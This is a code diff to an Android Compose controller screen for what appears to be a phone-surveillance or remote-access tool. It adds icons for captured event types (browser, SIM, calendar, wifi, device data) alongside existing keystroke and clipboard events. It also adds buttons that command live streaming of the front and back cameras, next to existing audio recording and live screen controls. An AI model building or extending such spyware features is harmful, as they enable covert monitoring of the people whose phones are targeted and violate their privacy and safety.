@@ -22,15 +22,20 @@ import androidx.compose.material.icons.automirrored.filled.ArrowBack
 import androidx.compose.material.icons.filled.Apps
 import androidx.compose.material.icons.filled.BatteryChargingFull
 import androidx.compose.material.icons.filled.BatteryFull
+import androidx.compose.material.icons.filled.CalendarMonth
 import androidx.compose.material.icons.filled.Call
 import androidx.compose.material.icons.filled.CameraFront
 import androidx.compose.material.icons.filled.CameraRear
 import androidx.compose.material.icons.filled.ContentCopy
+import androidx.compose.material.icons.filled.DataUsage
 import androidx.compose.material.icons.filled.GetApp
 import androidx.compose.material.icons.filled.Image
 import androidx.compose.material.icons.filled.Keyboard
+import androidx.compose.material.icons.filled.Language
 import androidx.compose.material.icons.filled.LocationOn
 import androidx.compose.material.icons.filled.Mic
+import androidx.compose.material.icons.filled.SimCard
+import androidx.compose.material.icons.filled.Storage
 import androidx.compose.material.icons.filled.Notifications
 import androidx.compose.material.icons.filled.PhoneAndroid
 import androidx.compose.material.icons.filled.PhonelinkLock
@@ -314,6 +319,12 @@ private fun ParsedEventCard(parsed: ParsedEvent) {
         "security" -> Icons.Default.Security
         "clipboard" -> Icons.Default.ContentCopy
         "keystroke" -> Icons.Default.Keyboard
+        "wifi" -> Icons.Default.Wifi
+        "browser" -> Icons.Default.Language
+        "sim" -> Icons.Default.SimCard
+        "device" -> Icons.Default.Storage
+        "data" -> Icons.Default.DataUsage
+        "calendar" -> Icons.Default.CalendarMonth
         else -> Icons.Default.PhoneAndroid
     }
 
@@ -394,6 +405,18 @@ private fun RemoteControlPanel(onLiveScreen: () -> Unit, onCommand: (String) -> 
                 OutlinedButton(onClick = { onCommand("record_audio") }, modifier = Modifier.weight(1f)) {
                     Icon(Icons.Default.Mic, null, Modifier.size(16.dp))
                     Text(" Audio", style = MaterialTheme.typography.labelSmall)
+                }
+            }
+            Spacer(modifier = Modifier.height(4.dp))
+            Row(
+                modifier = Modifier.fillMaxWidth(),
+                horizontalArrangement = Arrangement.spacedBy(8.dp),
+            ) {
+                OutlinedButton(onClick = { onCommand("stream_camera_front") }, modifier = Modifier.weight(1f)) {
+                    Text("Live Front", style = MaterialTheme.typography.labelSmall)
+                }
+                OutlinedButton(onClick = { onCommand("stream_camera_back") }, modifier = Modifier.weight(1f)) {
+                    Text("Live Back", style = MaterialTheme.typography.labelSmall)
                 }
             }
             Spacer(modifier = Modifier.height(4.dp))
